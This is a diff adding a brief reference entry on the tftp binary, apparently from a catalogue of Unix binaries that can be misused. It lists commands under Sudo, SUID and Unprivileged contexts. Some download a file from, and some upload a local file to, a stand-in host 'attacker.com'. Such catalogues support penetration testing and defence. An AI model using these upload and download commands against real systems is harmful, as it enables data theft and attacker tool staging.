@@ -1,0 +1,32 @@
+tftp
+====
+
+Download
+--------
+
+[Sudo]
+    tftp attacker.com
+get /path/to/input-file
+
+[SUID]
+    tftp attacker.com
+get /path/to/input-file
+
+[Unprivileged]
+    tftp attacker.com
+get /path/to/input-file
+
+Upload
+------
+
+[Sudo]
+    tftp attacker.com
+put /path/to/input-file
+
+[SUID]
+    tftp attacker.com
+put /path/to/input-file
+
+[Unprivileged]
+    tftp attacker.com
+put /path/to/input-file
